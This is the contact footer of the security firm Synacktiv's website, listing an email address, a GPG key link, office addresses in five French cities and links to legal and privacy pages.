contact@synacktiv.com

[GPG key](../../ressources/contact_synacktiv.asc)

## PARIS

5 boulevard Montmartre

75002 Paris

## TOULOUSE

4 Rue du Pont Guilhemery

31000 Toulouse

## LYON

56 rue Smith

69002 Lyon

## RENNES

7D Rue de ChÃ¢tillon

35000 Rennes

## LILLE

7 Boulevard Louis XIV

59000 Lille

Copyright Â© Synacktiv 2025

* [Conditions of Use](../legal-notice)
* [Privacy Policy](../privacy-policy)
* [Recruitment privacy policy](../politique-de-confidentialite-relative-au-recrutement)
* [Contact Us](../contact)


